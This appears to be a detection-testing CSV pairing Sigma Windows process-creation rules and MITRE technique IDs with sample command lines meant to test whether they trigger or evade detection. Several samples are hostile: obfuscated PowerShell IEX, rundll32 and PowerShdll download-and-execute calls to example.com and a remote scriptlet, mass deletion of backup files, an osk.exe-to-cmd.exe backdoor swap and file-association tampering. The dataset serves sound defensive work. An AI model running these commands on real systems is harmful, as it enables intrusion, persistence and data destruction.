Technical,Rule_name,Title,Rule_id,Command_match_rule,Commandline_evasion,Excutable,Bypass target rule,Bypass all rule,Trigger rule
t1027,proc_creation_win_powershell_cmdline_reversed_strings,Potential PowerShell Obfuscation Via Reversed Commands,b6b49cd1-34d6-4ead-b1bf-176e9edba9a4,,"powershell.exe -Command ""'$s' = 'etirw'; $rev = [char[]]$s; [array]::Reverse($rev); iex (-join $rev)""",FALSE,FALSE,FALSE,
t1027,proc_creation_win_powershell_cmdline_reversed_strings,Potential PowerShell Obfuscation Via Reversed Commands,b6b49cd1-34d6-4ead-b1bf-176e9edba9a4,,"powershell.exe -Command ""'$s' = 'golon'; $rev = [char[]]$s; [array]::Reverse($rev); iex (-join $rev)""",FALSE,FALSE,FALSE,
t1027,proc_creation_win_powershell_cmdline_special_characters,Potential PowerShell Command Line Obfuscation,d7bcd677-645d-4691-a8d4-7a5602b780d1,,"powershell.exe -Command ""& ( '{0}{1}{2}' -f 'I','EX','' ) ('Wri'+'te-H'+'ost ''Bypass''')""",FALSE,FALSE,FALSE,
t1027,proc_creation_win_powershell_cmdline_special_characters,Potential PowerShell Command Line Obfuscation,d7bcd677-645d-4691-a8d4-7a5602b780d1,,"powershell.exe -Command ""& { $cmd = 'IEX' ; & $cmd ('Wri'+'te-H'+'ost ''Bypass'') }""",FALSE,FALSE,FALSE,
t1027,proc_creation_win_powershell_cmdline_special_characters,Potential PowerShell Command Line Obfuscation,d7bcd677-645d-4691-a8d4-7a5602b780d1,,"powershell.exe -Command ""& { function Invoke-Command { param($cmd) iex $cmd } Invoke-Command ('Wri'+'te-H'+'ost ''Bypass'') }""",FALSE,FALSE,FALSE,
t1027,proc_creation_win_powershell_cmdline_special_characters,Potential PowerShell Command Line Obfuscation,d7bcd677-645d-4691-a8d4-7a5602b780d1,,"powershell.exe -Command ""& { $cmd = 'Write-Host'; $arg = 'Bypass'; & $cmd $arg }""",FALSE,FALSE,FALSE,
t1027,proc_creation_win_powershell_cmdline_special_characters,Potential PowerShell Command Line Obfuscation,d7bcd677-645d-4691-a8d4-7a5602b780d1,,"powershell.exe -Command ""& { $cmd = 'Write-Host'; & $cmd 'Bypass' }""",FALSE,FALSE,FALSE,
t1027,proc_creation_win_powershell_encoding_patterns,Potential Encoded PowerShell Patterns In CommandLine,cdf05894-89e7-4ead-b2b0-0a5f97a90f2f,,"powershell.exe -Command ""[char[]](83,116,97,114,116,45,80,114,111,99,101,115,115,32,99,97,108,99,46,101,120,101) | Join-String -Separator ''""",FALSE,FALSE,FALSE,
t1027,proc_creation_win_powershell_encoding_patterns,Potential Encoded PowerShell Patterns In CommandLine,cdf05894-89e7-4ead-b2b0-0a5f97a90f2f,,"powershell.exe -Command ""(83,116,97,114,116,45,80,114,111,99,101,115,115,32,99,97,108,99,46,101,120,101 | ForEach-Object {[char]$_}) -join ''""",FALSE,FALSE,FALSE,
t1027,proc_creation_win_powershell_encoding_patterns,Potential Encoded PowerShell Patterns In CommandLine,cdf05894-89e7-4ead-b2b0-0a5f97a90f2f,,"powershell.exe -Command ""[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('U2t5c3NlcnZlciB0ZXN0')) | IEX""",FALSE,FALSE,FALSE,
t1027,proc_creation_win_powershell_encoding_patterns,Potential Encoded PowerShell Patterns In CommandLine,cdf05894-89e7-4ead-b2b0-0a5f97a90f2f,,"powershell.exe -Command ""[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('V3JpdGUtSG9zdCAiSGVsbG8i')) | IEX""",FALSE,FALSE,FALSE,
t1027,proc_creation_win_powershell_frombase64string,Base64 Encoded PowerShell Command Detected,e32d4572-9826-4738-b651-95fa63747e8a,,"powershell.exe -Command ""[Convert]::FromBase64String('SGVsbG8gV29ybGQ=')""",FALSE,FALSE,FALSE,
t1027,proc_creation_win_powershell_frombase64string,Base64 Encoded PowerShell Command Detected,e32d4572-9826-4738-b651-95fa63747e8a,,"powershell.exe -Command ""[System.Convert]::FromBase64String( 'SGVsbG8gV29ybGQ=' )""",FALSE,FALSE,FALSE,
t1027,proc_creation_win_powershell_frombase64string,Base64 Encoded PowerShell Command Detected,e32d4572-9826-4738-b651-95fa63747e8a,,"powershell.exe -Command ""$method = 'FromBase' + '64String'; [Convert]::$method('SGVsbG8gV29ybGQ=')""",FALSE,FALSE,FALSE,
t1027,proc_creation_win_powershell_frombase64string,Base64 Encoded PowerShell Command Detected,e32d4572-9826-4738-b651-95fa63747e8a,,"powershell.exe -Command ""IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\Microsoft\Windows\CurrentVersion Debug).Debug)))""",FALSE,FALSE,FALSE,
t1027,proc_creation_win_powershell_frombase64string,Base64 Encoded PowerShell Command Detected,e32d4572-9826-4738-b651-95fa63747e8a,,"powershell.exe -Command ""[Convert]::FromBase64String([System.Text.Encoding]::ASCII.GetBytes('SGVsbG8gV29ybGQ='))""",FALSE,FALSE,FALSE,
t1027,proc_creation_win_powershell_frombase64string,Base64 Encoded PowerShell Command Detected,e32d4572-9826-4738-b651-95fa63747e8a,,"powershell.exe -Command ""[Convert]::FromBase64String([System.Text.Encoding]::ASCII.GetString([System.Text.Encoding]::ASCII.GetBytes('SGVsbG8gV29ybGQ=')))""",FALSE,FALSE,FALSE,
t1027,proc_creation_win_powershell_frombase64string,Base64 Encoded PowerShell Command Detected,e32d4572-9826-4738-b651-95fa63747e8a,,"powershell.exe -Command ""[Convert]::FromBase64String([System.Text.Encoding]::ASCII.GetString([System.Text.Encoding]::ASCII.GetBytes([System.Text.Encoding]::ASCII.GetBytes('SGVsbG8gV29ybGQ='))))""",FALSE,FALSE,FALSE,
t1027,proc_creation_win_renamed_autoit,Renamed AutoIt Execution,f4264e47-f522-4c38-a420-04525d5b880f,,updater.exe /AutoIt3ExecuteScript script.au3,FALSE,FALSE,FALSE,
t1027,proc_creation_win_renamed_autoit,Renamed AutoIt Execution,f4264e47-f522-4c38-a420-04525d5b880f,,updater.exe -AutoIt3ExecuteScript script.au3,FALSE,FALSE,FALSE,
t1027,proc_creation_win_renamed_autoit,Renamed AutoIt Execution,f4264e47-f522-4c38-a420-04525d5b880f,,updater.exe script.au3 /ErrorStdOut,FALSE,FALSE,FALSE,
t1027,proc_creation_win_renamed_autoit,Renamed AutoIt Execution,f4264e47-f522-4c38-a420-04525d5b880f,,updater.exe script.au3 /AutoIt3ExecuteScript /ErrorStdOut,FALSE,FALSE,FALSE,
t1027,proc_creation_win_renamed_autoit,Renamed AutoIt Execution,f4264e47-f522-4c38-a420-04525d5b880f,,updater.exe script.au3 -AutoIt3ExecuteScript -ErrorStdOut,FALSE,FALSE,FALSE,
t1027,proc_creation_win_renamed_autoit,Renamed AutoIt Execution,f4264e47-f522-4c38-a420-04525d5b880f,,updater.exe script.au3 /AutoIt3ExecuteScript,FALSE,FALSE,FALSE,
t1614.001,proc_creation_win_chcp_codepage_lookup,Console CodePage Lookup Via CHCP,7090adee-82e2-4269-bd59-80691e7c6338,,"cmd.exe /v /c ""set a=chcp&& !a!""",FALSE,FALSE,FALSE,
t1614.001,proc_creation_win_chcp_codepage_lookup,Console CodePage Lookup Via CHCP,7090adee-82e2-4269-bd59-80691e7c6338,,"powershell.exe -Command ""& {chcp}""",FALSE,FALSE,FALSE,
t1218.011,proc_creation_win_citrix_trolleyexpress_procdump,Process Access via TrolleyExpress Exclusion,4c0aaedc-154c-4427-ada0-d80ef9c9deb6,,TrolleyExpress.exe 755,FALSE,FALSE,FALSE,
t1218.011,proc_creation_win_citrix_trolleyexpress_procdump,Process Access via TrolleyExpress Exclusion,4c0aaedc-154c-4427-ada0-d80ef9c9deb6,,"TrolleyExpress.exe ""755""",FALSE,FALSE,FALSE,
t1218.011,proc_creation_win_citrix_trolleyexpress_procdump,Process Access via TrolleyExpress Exclusion,4c0aaedc-154c-4427-ada0-d80ef9c9deb6,,TrolleyExpress.exe -ma 755,FALSE,FALSE,FALSE,
t1218.011,proc_creation_win_citrix_trolleyexpress_procdump,Process Access via TrolleyExpress Exclusion,4c0aaedc-154c-4427-ada0-d80ef9c9deb6,,TrolleyExpress.exe 1044,FALSE,FALSE,FALSE,
t1218.011,proc_creation_win_citrix_trolleyexpress_procdump,Process Access via TrolleyExpress Exclusion,4c0aaedc-154c-4427-ada0-d80ef9c9deb6,,TrolleyExpress.exe 700,FALSE,FALSE,FALSE,
t1218.011,proc_creation_win_rundll32_susp_execution_with_image_extension,Suspicious Rundll32 Execution With Image Extension,4aa6040b-3f28-44e3-a769-9208e5feb5ec,,"""C:\\WINDOWS\\system32\\rundll32.exe"" C:\\Users\\thaim\\Downloads\\calc.png StartW",FALSE,FALSE,FALSE,
t1218.011,proc_creation_win_rundll32_susp_execution_with_image_extension,Suspicious Rundll32 Execution With Image Extension,4aa6040b-3f28-44e3-a769-9208e5feb5ec,,"rundll32.exe shell32.dll,Control_RunDLL C:\\Users\\Public\\malicious.png",FALSE,FALSE,FALSE,
t1218.011,proc_creation_win_rundll32_sys,Suspicious Rundll32 Activity Invoking Sys File,731231b9-0b5d-4219-94dd-abb6959aa7ea,,"rundll32.exe dummy\.\sys,EntryPoint",FALSE,FALSE,FALSE,
t1218.011,proc_creation_win_rundll32_sys,Suspicious Rundll32 Activity Invoking Sys File,731231b9-0b5d-4219-94dd-abb6959aa7ea,,"rundll32.exe dummy.sys\.,EntryPoint",FALSE,FALSE,FALSE,
t1218.011,proc_creation_win_rundll32_sys,Suspicious Rundll32 Activity Invoking Sys File,731231b9-0b5d-4219-94dd-abb6959aa7ea,,"rundll32.exe dummy.sys"",EntryPoint",FALSE,FALSE,FALSE,
t1218.011,proc_creation_win_rundll32_sys,Suspicious Rundll32 Activity Invoking Sys File,731231b9-0b5d-4219-94dd-abb6959aa7ea,,"rundll32.exe dummy.sys,EntryPoint",FALSE,FALSE,FALSE,
t1218.011,proc_creation_win_rundll32_udl_exec,Potentially Suspicious Rundll32.EXE Execution of UDL File,0ea52357-cd59-4340-9981-c46c7e900428,,"rundll32.exe oledb32.dll,OpenDSLFile ""C:\Users\Public\Downloads\example.udl""",FALSE,FALSE,FALSE,
t1218.011,proc_creation_win_rundll32_udl_exec,Potentially Suspicious Rundll32.EXE Execution of UDL File,0ea52357-cd59-4340-9981-c46c7e900428,,"cmd.exe /c rundll32.exe oledb32.dll,OpenDSLFile C:\Users\user\Downloads\test.udl",FALSE,FALSE,FALSE,
t1218.011,proc_creation_win_rundll32_udl_exec,Potentially Suspicious Rundll32.EXE Execution of UDL File,0ea52357-cd59-4340-9981-c46c7e900428,,"rundll32.exe oledb32.dll,OpenDSLFile ""C:\Users\admin\Downloads\test.udl""",FALSE,FALSE,FALSE,
t1218.011,proc_creation_win_rundll32_udl_exec,Potentially Suspicious Rundll32.EXE Execution of UDL File,0ea52357-cd59-4340-9981-c46c7e900428,,"rundll32.exe oledb32.dll,OpenDSLFile C:\ProgramData\test.udl",FALSE,FALSE,FALSE,
t1218.011,proc_creation_win_rundll32_uncommon_dll_extension,Rundll32 Execution With Uncommon DLL Extension,c3a99af4-35a9-4668-879e-c09aeb4f2bdf,,rundll32.exe  C:\Users\thaim\Downloads\calc.png StartW,FALSE,FALSE,FALSE,
t1218.011,proc_creation_win_rundll32_uncommon_dll_extension,Rundll32 Execution With Uncommon DLL Extension,c3a99af4-35a9-4668-879e-c09aeb4f2bdf,,"rundll32  vbscript:""\..\mshtml,#135 ""+String(CreateObject(""WScript.Shell"").Run(""calc.exe""),0)",FALSE,FALSE,FALSE,
t1218.011,proc_creation_win_rundll32_uncommon_dll_extension,Rundll32 Execution With Uncommon DLL Extension,c3a99af4-35a9-4668-879e-c09aeb4f2bdf,,"rundll32.exe  C:\AtomicRedTeam\atomics\T1218.011\bin\_WT.init,krnl",FALSE,FALSE,FALSE,
t1218.011,proc_creation_win_rundll32_uncommon_dll_extension,Rundll32 Execution With Uncommon DLL Extension,c3a99af4-35a9-4668-879e-c09aeb4f2bdf,,"rundll32.exe  javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct"").Exec();window.close();",FALSE,FALSE,FALSE,
t1218.011,proc_creation_win_rundll32_uncommon_dll_extension,Rundll32 Execution With Uncommon DLL Extension,c3a99af4-35a9-4668-879e-c09aeb4f2bdf,,"""C:\Windows\System32\RUNDLL32.EXE"" -sta {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}",FALSE,FALSE,FALSE,
t1218.011,proc_creation_win_rundll32_uncommon_dll_extension,Rundll32 Execution With Uncommon DLL Extension,c3a99af4-35a9-4668-879e-c09aeb4f2bdf,,"""C:\WINDOWS\system32\rundll32.exe"" keymgr,KRShowKeyMgr",FALSE,FALSE,FALSE,
t1218.011,proc_creation_win_rundll32_uncommon_dll_extension,Rundll32 Execution With Uncommon DLL Extension,c3a99af4-35a9-4668-879e-c09aeb4f2bdf,,"rundll32  C:\Users\thaim\Downloads\calc.png,StartW",FALSE,FALSE,FALSE,
t1218.011,proc_creation_win_rundll32_uncommon_dll_extension,Rundll32 Execution With Uncommon DLL Extension,c3a99af4-35a9-4668-879e-c09aeb4f2bdf,,"rundll32.exe  C:\Users\thaim\Downloads\calc.png,StartW",FALSE,FALSE,FALSE,
t1218.011,proc_creation_win_susp_powershell_execution_via_dll,Potential PowerShell Execution Via DLL,6812a10b-60ea-420c-832f-dfcc33b646ba,,"rundll32.exe PowerShdll.dll,main -c ""I`e`x (New-Object Net.WebClient).D`o`wnloadString('http://example.com/payload')""",FALSE,FALSE,FALSE,
t1218.011,proc_creation_win_susp_powershell_execution_via_dll,Potential PowerShell Execution Via DLL,6812a10b-60ea-420c-832f-dfcc33b646ba,,"rundll32.exe PowerShdll.dll,main -c ""IEX(New-Object Net.WebClient).DownloadData('http://example.com/payload')""",FALSE,FALSE,FALSE,
t1218.011,proc_creation_win_susp_powershell_execution_via_dll,Potential PowerShell Execution Via DLL,6812a10b-60ea-420c-832f-dfcc33b646ba,,"rundll32.exe PowerShdll.dll,main -c ""Invoke-RestMethod -Uri http://example.com/payload | IEX""",FALSE,FALSE,FALSE,
t1090.001,proc_creation_win_cloudflared_quicktunnel_execution,Cloudflared Quick Tunnel Execution,222129f7-f4dc-4568-b0d2-22440a9639ba,,"""cloudflared.exe"" -url http://example.com -no-autoupdate",FALSE,FALSE,FALSE,
t1090.001,proc_creation_win_cloudflared_quicktunnel_execution,Cloudflared Quick Tunnel Execution,222129f7-f4dc-4568-b0d2-22440a9639ba,,"""cloudflared.exe"" --url http://example.com --no-autoupdate",FALSE,FALSE,FALSE,
t1090.001,proc_creation_win_pua_chisel,PUA - Chisel Tunneling Tool Execution,8b0e12da-d3c3-49db-bb4f-256703f380e5,,chisel.exe client 10.0.0.5:8080,FALSE,FALSE,FALSE,
t1090.001,proc_creation_win_renamed_cloudflared,Renamed Cloudflared.EXE Execution,e0c69ebd-b54f-4aed-8ae3-e3467843f3f0,,"""cloudflared.exe"" tunnel run -config C:\temp\myconfig.yml --token abcdef123456",FALSE,FALSE,FALSE,
t1090.001,proc_creation_win_renamed_cloudflared,Renamed Cloudflared.EXE Execution,e0c69ebd-b54f-4aed-8ae3-e3467843f3f0,,"""cloudflared.exe"" tunnel run --config C:\temp\myconfig.yml -token abcdef123456",FALSE,FALSE,FALSE,
t1090.001,proc_creation_win_renamed_cloudflared,Renamed Cloudflared.EXE Execution,e0c69ebd-b54f-4aed-8ae3-e3467843f3f0,,"""cloudflared.exe"" tunnel run --config C:\temp\myconfig.yml --token abcdef123456",FALSE,FALSE,FALSE,
t1102,proc_creation_win_cloudflared_tunnel_cleanup,Cloudflared Tunnel Connections Cleanup,7050bba1-1aed-454e-8f73-3f46f09ce56a,,cloudflared.exe tunnel cleanup --config C:\temp\config.yml --connector-id=ABC123,FALSE,FALSE,FALSE,
t1102,proc_creation_win_cloudflared_tunnel_cleanup,Cloudflared Tunnel Connections Cleanup,7050bba1-1aed-454e-8f73-3f46f09ce56a,,"cloudflared.exe tunnel cleanup --config C:\temp\config.yml --connector-id=""ABC-123-DEF""",FALSE,FALSE,FALSE,
t1102,proc_creation_win_cloudflared_tunnel_cleanup,Cloudflared Tunnel Connections Cleanup,7050bba1-1aed-454e-8f73-3f46f09ce56a,,cloudflared.exe tunnel cleanup --config C:\temp\config.yml --connector-id=ABC123 --,FALSE,FALSE,FALSE,
t1102,proc_creation_win_cloudflared_tunnel_cleanup,Cloudflared Tunnel Connections Cleanup,7050bba1-1aed-454e-8f73-3f46f09ce56a,,cloudflared.exe tunnel cleanup --config C:\temp\config.yml --connector-id=ABC123 -v,FALSE,FALSE,FALSE,
t1102,proc_creation_win_cloudflared_tunnel_cleanup,Cloudflared Tunnel Connections Cleanup,7050bba1-1aed-454e-8f73-3f46f09ce56a,,cloudflared.exe tunnel cleanup --config C:\temp\config.yml --connector-id=ABC123 --log-level=debug,FALSE,FALSE,FALSE,
t1102,proc_creation_win_cloudflared_tunnel_run,Cloudflared Tunnel Execution,9a019ffc-3580-4c9d-8d87-079f7e8d3fd4,,cloudflared.exe tunnel run --token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...,FALSE,FALSE,FALSE,
t1102,proc_creation_win_cloudflared_tunnel_run,Cloudflared Tunnel Execution,9a019ffc-3580-4c9d-8d87-079f7e8d3fd4,,cloudflared.exe tunnel run --token eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...,FALSE,FALSE,FALSE,
t1102,proc_creation_win_cloudflared_tunnel_run,Cloudflared Tunnel Execution,9a019ffc-3580-4c9d-8d87-079f7e8d3fd4,,cloudflared.exe^ tunnel^ run^ --token^ eyJhbGciOiJIUZI1NiIsInR5cCI6IkpXVCJ9...,FALSE,FALSE,FALSE,
t1102,proc_creation_win_cloudflared_tunnel_run,Cloudflared Tunnel Execution,9a019ffc-3580-4c9d-8d87-079f7e8d3fd4,,cloudflared.exe tunnel run --token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... --log-level=info,FALSE,FALSE,FALSE,
t1102,proc_creation_win_cloudflared_tunnel_run,Cloudflared Tunnel Execution,9a019ffc-3580-4c9d-8d87-079f7e8d3fd4,,set TUNNEL_TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... && cloudflared.exe tunnel run --token=%TUNNEL_TOKEN%,FALSE,FALSE,FALSE,
t1102,proc_creation_win_cloudflared_tunnel_run,Cloudflared Tunnel Execution,9a019ffc-3580-4c9d-8d87-079f7e8d3fd4,,cloudflared.exe -tunnel -run --token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...,FALSE,FALSE,FALSE,
t1102,proc_creation_win_cloudflared_tunnel_run,Cloudflared Tunnel Execution,9a019ffc-3580-4c9d-8d87-079f7e8d3fd4,,cloudflared.exe tunnel run --token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... --config=C:\\path\\to\\config.json,FALSE,FALSE,FALSE,
t1102,proc_creation_win_java_manageengine_susp_child_process,Suspicious Child Process Of Manage Engine ServiceDesk,cea2b7ea-792b-405f-95a1-b903ea06458f,,cmd.exe /c powershell.exe -nop -ep bypass,FALSE,FALSE,FALSE,
t1102,proc_creation_win_java_manageengine_susp_child_process,Suspicious Child Process Of Manage Engine ServiceDesk,cea2b7ea-792b-405f-95a1-b903ea06458f,,MSBuild.exe C:\path\to\malicious.xml,FALSE,FALSE,FALSE,
t1102,proc_creation_win_java_manageengine_susp_child_process,Suspicious Child Process Of Manage Engine ServiceDesk,cea2b7ea-792b-405f-95a1-b903ea06458f,,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication"";document.write();",FALSE,FALSE,FALSE,
t1546.001,proc_creation_win_cmd_assoc_execution,Change Default File Association Via Assoc,3d3aa6cd-6272-44d6-8afc-7e88dfef7061,,cmd.exe /c assoc .hta=txtfile,FALSE,FALSE,FALSE,
t1546.001,proc_creation_win_cmd_assoc_execution,Change Default File Association Via Assoc,3d3aa6cd-6272-44d6-8afc-7e88dfef7061,,cmd /c assoc .hta=txtfile,FALSE,FALSE,FALSE,
t1546.001,proc_creation_win_cmd_assoc_execution,Change Default File Association Via Assoc,3d3aa6cd-6272-44d6-8afc-7e88dfef7061,,"cmd.exe /c ""assoc .hta=txtfile""",FALSE,FALSE,FALSE,
t1546.001,proc_creation_win_cmd_assoc_tamper_exe_file_association,Change Default File Association To Executable Via Assoc,ae6f14e6-14de-45b0-9f44-c0986f50dc89,,assoc .txt=exefile,FALSE,FALSE,FALSE,
t1546.001,proc_creation_win_cmd_assoc_tamper_exe_file_association,Change Default File Association To Executable Via Assoc,ae6f14e6-14de-45b0-9f44-c0986f50dc89,,"assoc .txt=""exefile""",FALSE,FALSE,FALSE,
t1546.001,proc_creation_win_cmd_assoc_tamper_exe_file_association,Change Default File Association To Executable Via Assoc,ae6f14e6-14de-45b0-9f44-c0986f50dc89,,cmd /c assoc .txt=exefile,FALSE,FALSE,FALSE,
t1070.004,proc_creation_win_cmd_del_execution,File Deletion Via Del,379fa130-190e-4c3f-b7bc-6c8e834485f3,,"""cmd.exe"" /c del /f %TEMP%\deleteme_T1551.004",FALSE,FALSE,FALSE,
t1070.004,proc_creation_win_cmd_del_execution,File Deletion Via Del,379fa130-190e-4c3f-b7bc-6c8e834485f3,,"""cmd.exe"" /c del %TEMP%\PrintBrm.zip >nul 2>&1  & C:\Windows\System32\spool\tools\PrintBrm.exe -b -d \\127.0.0.1\c$\AtomicRedTeam\atomics\T1105\src\  -f %TEMP%\PrintBrm.zip -O FORCE",FALSE,FALSE,FALSE,
t1070.004,proc_creation_win_cmd_del_execution,File Deletion Via Del,379fa130-190e-4c3f-b7bc-6c8e834485f3,,"""cmd.exe"" /c pushd \\localhost\C$ & echo var fileObject = WScript.createobject(""Scripting.FileSystemObject"");var newfile = fileObject.CreateTextFile(""AtomicTestFileT1105.js"", true);newfile.WriteLine(""This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives."");newfile.Close(); > AtomicTestT1105.js & CScript.exe AtomicTestT1105.js //E:JScript & del AtomicTestT1105.js /Q >nul 2>&1 & del AtomicTestFileT1105.js /Q >nul 2>&1 & popd",FALSE,FALSE,FALSE,
t1070.004,proc_creation_win_cmd_del_execution,File Deletion Via Del,379fa130-190e-4c3f-b7bc-6c8e834485f3,,"""cmd.exe"" /c del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk",FALSE,FALSE,FALSE,
t1070.004,proc_creation_win_cmd_del_execution,File Deletion Via Del,379fa130-190e-4c3f-b7bc-6c8e834485f3,,"""cmd.exe"" /c IF NOT EXIST %windir%\System32\osk.exe.bak (copy %windir%\System32\osk.exe %windir%\System32\osk.exe.bak) ELSE ( pushd ) & takeown /F %windir%\System32\osk.exe /A & icacls %windir%\System32\osk.exe /grant Administrators:F /t & del %windir%\System32\osk.exe & mklink %windir%\System32\osk.exe %windir%\System32\cmd.exe",FALSE,FALSE,FALSE,
t1070.004,proc_creation_win_cmd_del_greedy_deletion,Greedy File Deletion Using Del,204b17ae-4007-471b-917b-b917b315c5db,,"cmd.exe /c ""cd C:\ProgramData && del *.dll""",FALSE,FALSE,FALSE,
t1070.004,proc_creation_win_cmd_del_greedy_deletion,Greedy File Deletion Using Del,204b17ae-4007-471b-917b-b917b315c5db,,"cmd.exe /c ""cd C:\ProgramData && erase *.dll""",FALSE,FALSE,FALSE,
t1070.004,proc_creation_win_cmd_del_greedy_deletion,Greedy File Deletion Using Del,204b17ae-4007-471b-917b-b917b315c5db,,"cmd.exe /c ""cd C:\\ProgramData && del *.dll""",FALSE,FALSE,FALSE,
t1070.004,proc_creation_win_cmd_del_greedy_deletion,Greedy File Deletion Using Del,204b17ae-4007-471b-917b-b917b315c5db,,"cmd.exe /c ""cd C:\ProgramData && del \*.dll""",FALSE,FALSE,FALSE,
t1070.004,proc_creation_win_cmd_del_greedy_deletion,Greedy File Deletion Using Del,204b17ae-4007-471b-917b-b917b315c5db,,"cmd.exe /c ""cd C:\ProgramData && del *.dll & exit""",FALSE,FALSE,FALSE,
t1070.004,proc_creation_win_cmd_ping_copy_combined_execution,Potentially Suspicious Ping/Copy Command Combination,ded2b07a-d12f-4284-9b76-653e37b6c8b0,,cmd.exe /c ping -n 1 127.0.0.1 & copy C:\Windows\System32\drivers\etc\hosts C:\Temp\hosts.bak,FALSE,FALSE,FALSE,
t1070.004,proc_creation_win_cmd_ping_copy_combined_execution,Potentially Suspicious Ping/Copy Command Combination,ded2b07a-d12f-4284-9b76-653e37b6c8b0,,"cmd.exe /c ""ping -n 1 127.0.0.1"" && ""copy C:\\Windows\\System32\\drivers\\etc\\hosts C:\\Temp\\hosts.bak""",FALSE,FALSE,FALSE,
t1070.004,proc_creation_win_cmd_ping_copy_combined_execution,Potentially Suspicious Ping/Copy Command Combination,ded2b07a-d12f-4284-9b76-653e37b6c8b0,,cmd.exe /c ping -n 1 127.0.0.1 && copy /y C:\Windows\System32\drivers\etc\hosts C:\Temp\hosts.bak,FALSE,FALSE,FALSE,
t1070.004,proc_creation_win_cmd_ping_copy_combined_execution,Potentially Suspicious Ping/Copy Command Combination,ded2b07a-d12f-4284-9b76-653e37b6c8b0,,cmd.exe /c ping -n 1 127.0.0.1 && copy C:\Windows\System32\drivers\etc\hosts C:\Temp\hosts.bak,FALSE,FALSE,FALSE,
t1070.004,proc_creation_win_cmd_ping_del_combined_execution,Suspicious Ping/Del Command Combination,54786ddc-5b8a-11ed-9b6a-0242ac120002,,ping 127.0.0.1 -n 5 >NUL && del /f /q lockbit.exe,FALSE,FALSE,FALSE,
t1070.004,proc_creation_win_cmd_ping_del_combined_execution,Suspicious Ping/Del Command Combination,54786ddc-5b8a-11ed-9b6a-0242ac120002,,ping 127.0.0.1 -n 5 > NUL & del lockbit.exe,FALSE,FALSE,FALSE,
t1070.004,proc_creation_win_cmd_ping_del_combined_execution,Suspicious Ping/Del Command Combination,54786ddc-5b8a-11ed-9b6a-0242ac120002,,ping 127.0.0.1 -n 5 >NUL & del /f /q lockbit.exe,FALSE,FALSE,FALSE,
t1070.004,proc_creation_win_cmd_ping_del_combined_execution,Suspicious Ping/Del Command Combination,54786ddc-5b8a-11ed-9b6a-0242ac120002,,ping 127.0.0.1 -n 5 > NUL && del lockbit.exe,FALSE,FALSE,FALSE,
t1070.004,proc_creation_win_cmd_rmdir_execution,Directory Removal Via Rmdir,41ca393d-538c-408a-ac27-cf1e038be80c,,"cmd.exe /c rmdir /s /q ""%temp%\deleteme_T1551.004""",FALSE,FALSE,FALSE,
t1070.004,proc_creation_win_cmd_rmdir_execution,Directory Removal Via Rmdir,41ca393d-538c-408a-ac27-cf1e038be80c,,cmd.exe /c rd /s /q C:\temp\malicious_folder,FALSE,FALSE,FALSE,
t1070.004,proc_creation_win_cmd_rmdir_execution,Directory Removal Via Rmdir,41ca393d-538c-408a-ac27-cf1e038be80c,,cmd.exe /c rmdir /q /s %temp%\deleteme_T1551.004,FALSE,FALSE,FALSE,
t1217,proc_creation_win_cmd_dir_execution,File And SubFolder Enumeration Via Dir Command,7c9340a9-e2ee-4e43-94c5-c54ebbea1006,,cmd.exe /c dir /s c:\ >> %temp%\T1083Test1.txt,FALSE,FALSE,FALSE,
t1217,proc_creation_win_cmd_dir_execution,File And SubFolder Enumeration Via Dir Command,7c9340a9-e2ee-4e43-94c5-c54ebbea1006,,cmd.exe /c dir /S c:\ >> %temp%\T1083Test1.txt,FALSE,FALSE,FALSE,
